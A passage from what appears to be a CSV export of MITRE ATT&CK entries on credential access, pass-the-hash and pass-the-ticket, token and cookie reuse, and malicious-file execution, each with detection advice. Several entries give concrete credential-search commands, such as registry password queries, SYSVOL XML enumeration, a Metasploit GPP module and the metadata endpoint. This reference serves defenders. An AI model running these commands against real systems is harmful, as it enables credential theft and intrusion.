Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)

If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)

The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.
",https://attack.mitre.org/techniques/T1552/005,11 February 2020,21 March 2023,enterprise-attack,1.4,Credential Access,"Monitor access to the Instance Metadata API and look for anomalous queries.

It may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).",IaaS,User Account: User Account Authentication,True,T1552,,Praetorian,,,,,,"(Citation: Cisco Talos Intelligence Group),(Citation: Trend Micro TeamTNT),(Citation: Unit 42 Hildegard Malware),(Citation: Peirates GitHub),(Citation: Amazon AWS IMDS V2),(Citation: RedLock Instance Metadata API 2018)"
T1552.007,attack-pattern--f8ef3a62-3f44-40a4-abca-761ab235c436,Unsecured Credentials: Container API,"Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)

An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. ",https://attack.mitre.org/techniques/T1552/007,31 March 2021,15 April 2023,enterprise-attack,1.2,Credential Access,"Establish centralized logging for the activity of container and Kubernetes cluster components. Monitor logs for actions that could be taken to gather credentials to container and cloud infrastructure, including the use of discovery API calls by new or unexpected users and APIs that access Docker logs.

It may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078).",Containers,"Command: Command Execution, User Account: User Account Authentication",True,T1552,,"Center for Threat-Informed Defense (CTID); Jay Chen, Palo Alto Networks; Yossi Weizman, Azure Defender Research Team",,,,,,"(Citation: Peirates GitHub),(Citation: Kubernetes API Control Access),(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Hardening Guide),(Citation: Microsoft AKS Azure AD 2023),(Citation: Kubernetes RBAC),(Citation: Kubernetes Service Accounts),(Citation: Kubernetes Cloud Native Security)"
T1552.001,attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc,Unsecured Credentials: Credentials In Files,"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",https://attack.mitre.org/techniques/T1552/001,04 February 2020,23 August 2023,enterprise-attack,1.2,Credential Access,"While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.","Containers, IaaS, Linux, Windows, macOS","Command: Command Execution, File: File Access, Process: Process Creation",True,T1552,,"Jay Chen, Palo Alto Networks; Microsoft Threat Intelligence Center (MSTIC); Rory McCune, Aqua Security; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",,,Access to files,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Invincea XTunnel),(Citation: Symantec Buckeye),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: AADInternals Documentation),(Citation: Symantec Elfin Mar 2019),(Citation: GitHub LaZagne Dec 2018),(Citation: Talos Smoke Loader July 2018),(Citation: GitHub PoshC2),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Volexity Patchwork June 2018),(Citation: F-Secure BlackEnergy 2014),(Citation: Symantec Leafminer July 2018),(Citation: Cisco Talos Intelligence Group),(Citation: GitHub QuasarRAT),(Citation: Symantec MuddyWater Dec 2018),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Cyberreason Anchor December 2019),(Citation: US-CERT Emotet Jul 2018),(Citation: TrendMicro Trickbot Feb 2019),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Trend Micro TeamTNT),(Citation: Unit 42 Hildegard Malware),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Proofpoint TA505 Sep 2017),(Citation: CrowdStrike Putter Panda),(Citation: Github PowerShell Empire),(Citation: Kaspersky Adwind Feb 2016),(Citation: FireEye APT34 July 2019),(Citation: Unit42 Azorult Nov 2018),(Citation: Unit42 OilRig Playbook 2023),(Citation: GitHub Pupy),(Citation: CERT-FR PYSA April 2020),(Citation: CIS Emotet Dec 2018),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: FireEye APT33 Guardrail),(Citation: FireEye APT35 2018),"
T1552.002,attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580,Unsecured Credentials: Credentials in Registry,"Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)

* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",https://attack.mitre.org/techniques/T1552/002,04 February 2020,28 July 2023,enterprise-attack,1.1,Credential Access,"Monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access",True,T1552,,"Sudhanshu Chauhan, @Sudhanshu_C",,,Ability to query some Registry locations depends on the adversary's level of access. User permissions are usually limited to access of user-related Registry keys.,,,"(Citation: CrowdStrike IceApple May 2022),(Citation: Cybereason Oceanlotus May 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Pentestlab Stored Credentials),(Citation: SentinelOne Valak June 2020),(Citation: TrendMicro Trickbot Feb 2019),(Citation: SentinelLabs Agent Tesla Aug 2020),"
T1552.006,attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e,Unsecured Credentials: Group Policy Preferences,"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)

These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>
* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>
",https://attack.mitre.org/techniques/T1552/006,11 February 2020,17 June 2020,enterprise-attack,1.0,Credential Access,"Monitor for attempts to access SYSVOL that involve searching for XML files. 

Deploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)",Windows,"Command: Command Execution, File: File Access",True,T1552,,,User,,,,,"(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Mandiant FIN12 Oct 2021),(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Symantec Elfin Mar 2019),(Citation: FireEye APT33 Guardrail),(Citation: ADSecurity Finding Passwords in SYSVOL),(Citation: Microsoft MS14-025),(Citation: MS14-025)"
T1552.004,attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf,Unsecured Credentials: Private Keys,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. 

Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)

When a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device’s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)

On network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) 

Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.",https://attack.mitre.org/techniques/T1552/004,04 February 2020,12 April 2023,enterprise-attack,1.1,Credential Access,"Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication. For network infrastructure devices, collect AAA logging to monitor for private keys being exported.","Linux, Network, Windows, macOS","Command: Command Execution, File: File Access",True,T1552,,"Austin Clark, @c2defense; Itzik Kotler, SafeBreach",,,,,,"(Citation: Kaspersky Adwind Feb 2016),(Citation: FoxIT Wocao December 2019),(Citation: Aqua Kinsing April 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Cybersecurity Advisory SVR TTP May 2021),(Citation: ESET Machete July 2019),(Citation: Trend Micro TeamTNT),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: AADInternals Documentation),(Citation: Microsoft 365 Defender Solorigate),(Citation: Adsecurity Mimikatz Guide),(Citation: Unit 42 Hildegard Malware),(Citation: MSTIC FoggyWeb September 2021),(Citation: Anomali Rocke March 2019),(Citation: Github PowerShell Empire),(Citation: ESET Ebury Feb 2014),(Citation: cisco_deploy_rsa_keys),(Citation: Microsoft Primary Refresh Token)"
T1550.001,attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51,Use Alternate Authentication Material: Application Access Token,"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.

Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) 

OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)

For example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)

Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)

Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",https://attack.mitre.org/techniques/T1550/001,30 January 2020,19 September 2023,enterprise-attack,1.5,"Defense Evasion, Lateral Movement","Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs. Additionally, administrators should review logs for calls to the AWS Security Token Service (STS) and usage of GCP service accounts in order to identify anomalous actions.(Citation: AWS Logging IAM Calls)(Citation: GCP Monitoring Service Account Usage)","Azure AD, Containers, Google Workspace, IaaS, Office 365, SaaS",Web Credential: Web Credential Usage,True,T1550,System Access Controls,"Dylan Silva, AWS Security; Ian Davila, Tidal Cyber; Jack Burns, HubSpot; Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Mark Wee; Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC); Shailesh Tiwary (Indian Army)",,,,,,"(Citation: Trend Micro Pawn Storm OAuth 2017),(Citation: Microsoft POLONIUM June 2022),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Peirates GitHub),(Citation: Microsoft Azure AD Admin Consent)"
T1550.002,attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e,Use Alternate Authentication Material: Pass the Hash,"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Adversaries may also use stolen password hashes to ""overpass the hash."" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",https://attack.mitre.org/techniques/T1550/002,30 January 2020,28 July 2023,enterprise-attack,1.2,"Defense Evasion, Lateral Movement","Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.

Event ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)",Windows,"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Creation, User Account: User Account Authentication",True,T1550,System Access Controls,"Blake Strom, Microsoft 365 Defender; Travis Smith, Tripwire",,,,,,"(Citation: Cybereason Cobalt Kitty 2017),(Citation: CME Github September 2018),(Citation: Mandiant FIN12 Oct 2021),(Citation: NCC Group Chimera January 2021),(Citation: Microsoft SIR Vol 19),(Citation: Mandiant FIN13 Aug 2022),(Citation: Mandiant APT1),(Citation: CISA AA20-301A Kimsuky),(Citation: BitDefender BADHATCH Mar 2021),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Adsecurity Mimikatz Guide),(Citation: NCSC Joint Report Public Tools),(Citation: McAfee Night Dragon),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: NSA Spotting),(Citation: GitHub IAD Secure Host Baseline UAC Filtering)"
T1550.003,attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926,Use Alternate Authentication Material: Pass the Ticket,"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)

A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)

A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)

Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, ""overpassing the hash"" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",https://attack.mitre.org/techniques/T1550/003,30 January 2020,30 March 2023,enterprise-attack,1.1,"Defense Evasion, Lateral Movement","Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.

Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to ""Integrity check on decrypted field failed"" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)",Windows,"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Creation, User Account: User Account Authentication",True,T1550,System Access Controls,Ryan Becwar; Vincent Le Toux,,,Kerberos authentication enabled,,,"(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Mandiant No Easy Breach),(Citation: Harmj0y DCSync Sept 2015),(Citation: Symantec Seaduke 2015),(Citation: Adsecurity Mimikatz Guide),(Citation: GitHub Pupy),(Citation: NCSC Joint Report Public Tools),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: STIG krbtgt reset),(Citation: ADSecurity Kerberos and KRBTGT),(Citation: ADSecurity AD Kerberos Attacks)"
T1550.004,attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0,Use Alternate Authentication Material: Web Session Cookie,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)

Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.

There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)",https://attack.mitre.org/techniques/T1550/004,30 January 2020,19 September 2023,enterprise-attack,1.3,"Defense Evasion, Lateral Movement",Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.,"Google Workspace, IaaS, Office 365, SaaS","Application Log: Application Log Content, Web Credential: Web Credential Usage",True,T1550,System Access Controls,"Jack Burns, HubSpot; Johann Rehberger",,,,,,"(Citation: Volexity SolarWinds),(Citation: CrowdStrike StellarParticle January 2022),"
T1204.002,attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e,User Execution: Malicious File,"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.

Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) 

While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",https://attack.mitre.org/techniques/T1204/002,11 March 2020,21 April 2023,enterprise-attack,1.3,Execution,"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.

Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).","Linux, Windows, macOS","File: File Creation, Process: Process Creation",True,T1204,,TruKno,,0.0,,,,"(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Unit 42 Inception November 2018),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: FBI FLASH APT39 September 2020),(Citation: Telefonica Snip3 December 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: Morphisec Snip3 May 2021),(Citation: Secure List Bad Rabbit),(Citation: ESET Casbaneiro Oct 2019),(Citation: SentinelOne Valak June 2020),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: Microsoft DUBNIUM July 2016),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Uptycs Confucius APT Jan 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Trend Micro Tick November 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: HP SVCReady Jun 2022),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Mandiant FIN12 Oct 2021),(Citation: Symantec Shuckworm January 2022),(Citation: Symantec WastedLocker June 2020),(Citation: Carbon Black JCry May 2019),(Citation: Zscaler Higaisa 2020),(Citation: IBM IcedID November 2017),(Citation: Symantec Inception Framework March 2018),(Citation: Symantec Whitefly March 2019),(Citation: Accenture MUDCARP March 2019),(Citation: TrendMicro Trickbot Feb 2019),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Nomadic Octopus 2018),(Citation: Ukraine15 - EISAC - 201603),(Citation: Talos Lokibot Jan 2021),(Citation: Unit 42 CARROTBAT November 2018),(Citation: SecureWorks August 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Trend Micro IXESHE 2012),(Citation: Picus Sodinokibi January 2020),(Citation: Check Point Warzone Feb 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Symantec Gallmaker Oct 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: FireEye APT19),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Unit 42 ProjectM March 2016),(Citation: FireEye admin@338),(Citation: Talos Frankenstein June 2019),(Citation: FireEye APT30),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Recorded Future REDDELTA July 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Proofpoint TA505 June 2018),(Citation: Unit 42 CARROTBAT January 2020),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Check Point APT34 April 2021),(Citation: Cylance Shaheen Nov 2018),(Citation: Symantec Chafer February 2018),(Citation: Talos Bisonal Mar 2020),(Citation: HackerNews IndigoZebra July 2021),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Proofpoint TA459 April 2017),(Citation: Cyble Sidewinder September 2020),(Citation: CheckPoint Bandook Nov 2020),(Citation: TrendMicro Tonto Team October 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: Microsoft Actinium February 2022),(Citation: FireEye APT10 Sept 2018),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: CISA AppleJeus Feb 2021),(Citation: Palo Alto Brute Ratel July 2022),(Citation: FireEye Metamorfo Apr 2018),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: ClearSky MuddyWater June 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Carbon Black HotCroissant April 2020),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: Proofpoint TA416 Europe March 2022),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Proofpoint TA2541 February 2022),(Citation: TrendMicro Gamaredon April 2020),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Securelist Machete Aug 2014),(Citation: Flashpoint FIN 7 March 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: FireEye APT32 April 2020),(Citation: Carbon Black Emotet Apr 2019),(Citation: Kaspersky MoleRATs April 2019),(Citation: Talos Promethium June 2020),(Citation: FireEye FIN7 April 2017),(Citation: CheckPoint Naikon May 2020),(Citation: Cylance Machete Mar 2017),(Citation: Symantec Elderwood Sept 2012),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Accenture Hogfish April 2018),(Citation: Cybereason Valak May 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Moran 2014),(Citation: Kaspersky WIRTE November 2021),(Citation: McAfee Lazarus Jul 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: Cylance Dust Storm),(Citation: Anomali Pirate Panda April 2020),(Citation: Reaqta MuddyWater November 2017),(Citation: SecureList Silence Nov 2017),(Citation: SANS Windshift August 2018),(Citation: FireEye Fin8 May 2016),(Citation: BitDefender Chafer May 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Talos MuddyWater May 2019),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Cybereason Molerats Dec 2020),(Citation: Proofpoint TA505 Mar 2018),(Citation: Trend Micro TA505 June 2019),(Citation: G Data Sodinokibi June 2019),(Citation: Unit 42 Gamaredon February 2022),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: FireEye Hancitor),(Citation: ESET Machete July 2019),(Citation: Group IB RTM August 2019),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Cyberint Qakbot May 2021),(Citation: MoustachedBouncer ESET August 2023),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Malwarebytes Konni Aug 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: VirusBulletin Kimsuky October 2019),(Citation: McAfee Bankshot),(Citation: Securelist Octopus Oct 2018),(Citation: CSM Elderwood Sept 2012),(Citation: Unit 42 Valak July 2020),(Citation: Lookout Dark Caracal Jan 2018),(Citation: ESET OceanLotus Mar 2019),(Citation: Cyberreason Anchor December 2019),(Citation: Unit 42 KerrDown February 2019),(Citation: Checkpoint Dridex Jan 2021),(Citation: Trend Micro Qakbot December 2020),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: Talos Cobalt Group July 2018),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Cybereason Oceanlotus May 2017),(Citation: IBM Grandoreiro April 2020),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: Unit 42 NETWIRE April 2020),(Citation: Intego Shlayer Feb 2018),(Citation: Kaspersky QakBot September 2021),(Citation: Group IB Silence Sept 2018),(Citation: Juniper IcedID June 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: FireEye Operation Saffron Rose 2013),(Citation: McAfee Honeybee),(Citation: NTT Security Flagpro new December 2021),(Citation: ESET Gamaredon June 2020),(Citation: 